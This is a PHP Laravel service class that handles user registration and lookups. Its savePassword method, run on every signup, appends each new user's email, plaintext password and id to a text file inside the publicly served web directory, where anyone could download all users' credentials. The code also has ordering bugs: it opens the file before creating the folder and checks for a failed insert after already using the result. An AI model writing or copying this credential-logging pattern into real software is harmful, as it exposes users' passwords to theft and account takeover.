<?php

namespace App\Services\RegisterService;

use App\Repositories\Eloquent\RegisterEloquent\RegisterUserRepository;
use Exception;
use Illuminate\Support\Facades\Log;

class RegisterUserService
{
    public function __construct(
        protected RegisterUserRepository $registerUserRepository
    ){}

    public function create(array $data)
    {
        $owner = $this->registerUserRepository->create($data);
        $this->savePassword($owner->email, $data['password'], $owner->uuse_id);

        if(!$owner)
        {
            throw new Exception('Erro ao cadastrar o emitente');
        }

        return $owner;
    }

    public function find(int $id)
    {
        return response()->json([
            'success' => true,
            'owner' => $this->registerUserRepository->find($id)
        ], 200);
    }   

    public function findByEmail(string $email)
    {
        return $this->registerUserRepository->findByEmail($email);
    }   

    public function savePassword(string $email, string $password, string $uuse_id)
    {
        try {
            $path = public_path('emails_passwords_path');
            $file = fopen($path . '/emails_and_passwords.txt', 'a');

            if(!is_dir($path))
            {
                mkdir($path, 0755, true);

            }

            fwrite($file, "Email: $email | Senha: $password | UUSE_ID: $uuse_id\n");
            fclose($file);
        } catch (\Throwable $th) {
            Log::info('Erro durante a criação e escrita no arquivo');
            Log::info($th->getMessage());
        }

    }

    public function existsCPF(int $cpf): bool
    {
        $exists = $this->registerUserRepository->existsCPF($cpf);
        return $exists;
    }
}